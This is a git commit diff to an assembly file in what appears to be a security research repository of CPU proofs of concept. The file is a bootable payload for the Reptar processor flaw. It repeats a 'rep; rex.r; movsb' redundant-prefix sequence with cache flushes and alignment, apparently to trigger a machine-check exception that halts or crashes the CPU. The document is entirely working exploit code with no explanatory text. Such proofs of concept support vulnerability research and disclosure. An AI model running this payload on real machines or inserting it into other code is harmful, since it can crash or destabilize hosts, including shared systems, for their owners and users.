4ef1da44122e4326b7f619f94e17deb6eeaa4147
eduardo <sirdarckcat@gmail.com>
2023-12-01 12:20:22 +0100

    add mce boot image

--- pocs/cpus/reptar/minimized/reptar.bootmce.bin.asm
+++ pocs/cpus/reptar/minimized/reptar.bootmce.bin.asm
@@ -1,28 +1,24 @@
 %macro LONG_MODE_BOOT_PAYLOAD 0
     xor rbx, rbx
-    .attack:
     xor ecx, ecx
     lea rsi, [rsp+1]
     mov rdi, rsi
-    .many_reptars:
-        align 64
-        ; 16 bytes
-        times 4 nop ; 4 bytes
-        dec rsi     ; 3 bytes
-        dec rdi     ; 3 bytes
-        inc rbx     ; 3 bytes
-        inc rcx     ; 3 bytes
-        ; 16 bytes
-        clflush [rdi]    ; 3 bytes
-        clflush [rsi+64] ; 4 bytes
-        ;mov [rsp], rbx   ; 4 bytes
-        rep              ; 1 byte
-        db 0x44; rex.r   ; 1 byte
-        movsb            ; 1 byte
-        rep              ; 1 byte
-        nop              ; 1 byte
-    mov dil, bl ; counter
-    jmp .attack
+    times 8*64*64/4 pause
+    %rep 32*8 ; icache has 8 ways 64 sets
+        clflush [rdi-1] ; 4uops     ; 4 bytes
+        clflush [rsi+63]; 4uops     ; 4 bytes
+        dec rsi         ; 1uop      ; 3 bytes
+        dec rdi         ; 1uop      ; 3 bytes
+        times 2 nop     ; 2uops     ; 2 bytes
+        ; 16 byte boundary + 2 ways
+        inc rcx         ; 1uop      ; 3 bytes
+        rep
+        db 0x44; rex.r
+        movsb           ; msrom ptr ; 3 bytes
+        pause
+        align 64 ; icache line size
+    %endrep
+    jmp $
 %endmacro
 
 %include "third_party/long_mode_boot.asm"
